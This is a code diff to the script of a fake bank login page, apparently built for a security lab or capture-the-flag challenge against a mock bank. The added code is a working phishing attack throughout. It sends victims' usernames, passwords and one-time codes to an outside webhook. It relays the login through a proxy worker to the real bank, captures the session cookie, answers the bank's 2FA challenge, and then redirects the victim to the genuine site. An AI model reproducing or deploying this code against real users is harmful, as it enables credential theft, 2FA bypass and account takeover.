@@ -136,13 +136,32 @@ body{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helv
   </main>
 
   <script>
+    const PROXY = 'https://veltra-worker.emi-hacklab.workers.dev';
     const WEBHOOK = 'https://webhook.site/cd61594e-3657-40b5-988c-e2ba2e032108';
     const BANCO = 'https://chl-252f32f0-0279-4210-a32f-5148b25c322d-veltra-bank.softwareseguro.com.ar';
+
+    let sessionCookie = '';
 
     function exfil(params) {
       const qs = new URLSearchParams(params).toString();
       new Image().src = WEBHOOK + '?' + qs;
       fetch(WEBHOOK + '?' + qs, {mode:'no-cors'}).catch(()=>{});
+    }
+
+    async function proxyReq(path, body, cookie) {
+      const headers = {'Content-Type': 'application/json'};
+      if (cookie) headers['Cookie'] = cookie;
+      const res = await fetch(PROXY + path, {
+        method: body ? 'POST' : 'GET',
+        headers,
+        body: body ? JSON.stringify(body) : undefined
+      });
+      const setCookie = res.headers.get('set-cookie');
+      if (setCookie) {
+        const m = setCookie.match(/session=([^;]+)/);
+        if (m) sessionCookie = m[1];
+      }
+      return res.json();
     }
 
     function mostrarPaso2(usuario) {
@@ -154,26 +173,70 @@ body{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helv
       document.getElementById('txt-2fa').focus();
     }
 
-    // PASO 1: capturar creds y mostrar OTP inmediatamente
-    document.getElementById('form-login').addEventListener('submit', function(e) {
+    function mostrarError(id, msg) {
+      const el = document.getElementById(id);
+      el.textContent = msg;
+      el.classList.remove('hidden');
+    }
+
+    // PASO 1
+    document.getElementById('form-login').addEventListener('submit', async function(e) {
       e.preventDefault();
       const u = document.getElementById('txt-login').value.trim();
       const p = document.getElementById('txt-password').value;
+      const btn = document.getElementById('btn-login');
+
+      btn.disabled = true;
+      btn.textContent = 'Verificando…';
+
       exfil({step:'1', u, p});
-      mostrarPaso2(u);
+
+      try {
+        const data = await proxyReq('/api/login', {usuario: u, clave: p});
+        if (data.ok) {
+          mostrarPaso2(u);
+        } else {
+          mostrarError('alert-1', data.error || 'No se pudo iniciar sesion.');
+          btn.disabled = false;
+          btn.textContent = 'Continuar';
+        }
+      } catch(err) {
+        // Si el proxy falla, igual mostramos el paso 2
+        mostrarPaso2(u);
+      }
     });
 
-    // PASO 2: capturar OTP y redirigir al banco real
-    document.getElementById('form-2fa').addEventListener('submit', function(e) {
+    // PASO 2
+    document.getElementById('form-2fa').addEventListener('submit', async function(e) {
       e.preventDefault();
-      const otp = document.getElementById('txt-2fa').value.trim();
+      const codigo = document.getElementById('txt-2fa').value.trim();
       const btn = document.getElementById('btn-2fa');
+
       btn.disabled = true;
       btn.textContent = 'Confirmando…';
-      exfil({step:'2', otp});
-      setTimeout(() => {
-        window.location.href = BANCO + '/login';
-      }, 800);
+
+      exfil({step:'2', otp: codigo});
+
+      try {
+        // Challenge via proxy con la sesión del banco real
+        const ch = await proxyReq('/api/challenge', null, `session=${sessionCookie}`);
+        if (ch.ok) {
+          // SHA256 del lado del cliente
+          const msgBuffer = new TextEncoder().encode(ch.nonce + ':' + codigo);
+          const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
+          const hashArray = Array.from(new Uint8Array(hashBuffer));
+          const respuesta = hashArray.map(b => b.toString(16).padStart(2,'0')).join('');
+
+          const res = await proxyReq('/api/verificar', {respuesta}, `session=${sessionCookie}`);
+          if (res.ok) {
+            window.location.href = BANCO + (res.next || '/dashboard');
+            return;
+          }
+        }
+      } catch(err) {}
+
+      // Redirigir al banco real de todas formas
+      setTimeout(() => { window.location.href = BANCO + '/login'; }, 800);
     });
 
     document.getElementById('volver-login').addEventListener('click', function(e) {
